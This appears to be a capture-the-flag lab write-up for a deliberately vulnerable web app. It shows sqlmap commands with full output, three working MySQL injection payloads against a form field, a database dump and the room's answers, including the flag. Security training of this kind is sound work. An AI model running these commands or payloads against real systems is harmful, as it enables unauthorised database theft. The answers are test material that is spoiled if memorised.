vulnerable web application:

Note: 
List of ways to check for sql injection can be foud in https://owasp.org/www-community/attacks/SQL_Injection

Steps to be done;
1. Find Vulnerabilities
2. Retrieve Database
3. Dump Database


Set the url to the machine ip, and run the command
(Note: --forms executed as in the webpage we get a text field similar to form)
*/......................................................................................................................./*

â”€â”€(rootðŸ’€kali)-[~]
â””â”€# sqlmap -u http://10.10.100.55 --forms               
        ___
       __H__                                                                    
 ___ ___[.]_____ ___ ___  {1.5.4#stable}                                        
|_ -| . [.]     | .'| . |                                                       
|___|_  [,]_|_|_|__,|  _|                                                       
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:14:46 /2021-05-13/

[00:14:46] [INFO] testing connection to the target URL
[00:14:47] [INFO] searching for forms
[#1] form:
POST http://10.10.100.55/
POST data: msg=
do you want to test this form? [Y/n/q] 
> y
Edit POST data [default: msg=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] y
[00:14:51] [INFO] resuming back-end DBMS 'mysql' 
[00:14:51] [INFO] using '/root/.local/share/sqlmap/output/results-05132021_1214am.csv' as the CSV results file in multiple targets mode                         
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=ddqs' RLIKE (SELECT (CASE WHEN (3665=3665) THEN 0x64647173 ELSE 0x28 END))-- IGsh

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: msg=ddqs' AND GTID_SUBSET(CONCAT(0x716b6b7871,(SELECT (ELT(4894=4894,1))),0x716a7a6a71),4894)-- aaIm

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=ddqs' AND (SELECT 6322 FROM (SELECT(SLEEP(5)))WiQa)-- NTYq
---
do you want to exploit this SQL injection? [Y/n] y
[00:14:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL >= 5.6
[00:14:53] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-05132021_1214am.csv'

[*] ending @ 00:14:53 /2021-05-13/

*/......................................................................................................................./*

How many types of sqli is the site vulnerable to? --> 3

Dump the database.
*/......................................................................................................................./*
First: Retrieve database
# sqlmap -u http://10.10.100.55 --forms -a        
 
You are searching for:
current user: 'root@localhost'
[00:15:08] [INFO] fetching current database
[00:15:09] [INFO] retrieved: 'tests'
current database: 'tests'
_____________________________________________

Second: Dump database
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# sqlmap -u http://10.10.100.55 --forms -D tests --dump                   1 â¨¯
        ___
       __H__                                                                    
 ___ ___[.]_____ ___ ___  {1.5.4#stable}                                        
|_ -| . [(]     | .'| . |                                                       
|___|_  [,]_|_|_|__,|  _|                                                       
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:25:05 /2021-05-13/

[00:25:05] [INFO] testing connection to the target URL
[00:25:06] [INFO] searching for forms
[#1] form:
POST http://10.10.100.55/
POST data: msg=
do you want to test this form? [Y/n/q] 
> y
Edit POST data [default: msg=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] y
[00:25:10] [INFO] resuming back-end DBMS 'mysql' 
[00:25:10] [INFO] using '/root/.local/share/sqlmap/output/results-05132021_1225am.csv' as the CSV results file in multiple targets mode                         
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: msg (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=ddqs' RLIKE (SELECT (CASE WHEN (3665=3665) THEN 0x64647173 ELSE 0x28 END))-- IGsh

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: msg=ddqs' AND GTID_SUBSET(CONCAT(0x716b6b7871,(SELECT (ELT(4894=4894,1))),0x716a7a6a71),4894)-- aaIm

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=ddqs' AND (SELECT 6322 FROM (SELECT(SLEEP(5)))WiQa)-- NTYq
---
do you want to exploit this SQL injection? [Y/n] y
[00:25:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 7.0.33
back-end DBMS: MySQL >= 5.6
[00:25:17] [INFO] fetching tables for database: 'tests'
[00:25:17] [WARNING] reflective value(s) found and filtering out
[00:25:18] [INFO] retrieved: 'lol'
[00:25:18] [INFO] retrieved: 'msg'
[00:25:18] [INFO] fetching columns for table 'lol' in database 'tests'
[00:25:19] [INFO] retrieved: 'flag'
[00:25:19] [INFO] retrieved: 'varchar(100)'
[00:25:19] [INFO] fetching entries for table 'lol' in database 'tests'
[00:25:20] [INFO] retrieved: 'found_me'
Database: tests
Table: lol
[1 entry]
+----------+
| flag     |
+----------+
| found_me |
+----------+

[00:25:20] [INFO] table 'tests.lol' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.100.55/dump/tests/lol.csv'                                       
[00:25:20] [INFO] fetching columns for table 'msg' in database 'tests'
[00:25:21] [INFO] retrieved: 'msg'
[00:25:21] [INFO] retrieved: 'varchar(100)'
[00:25:21] [INFO] fetching entries for table 'msg' in database 'tests'
[00:25:22] [INFO] retrieved: 'msg'
[00:25:22] [INFO] retrieved: 'test'
Database: tests
Table: msg
[2 entries]
+------+
| msg  |
+------+
| msg  |
| test |
+------+

[00:25:22] [INFO] table 'tests.msg' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.100.55/dump/tests/msg.csv'                                       
[00:25:22] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.local/share/sqlmap/output/results-05132021_1225am.csv'

[*] ending @ 00:25:22 /2021-05-13/

*/......................................................................................................................./*

What is the name of the database? --> tests 

How many tables are in the database? --> 2

What is the value of the flag? --> found_me
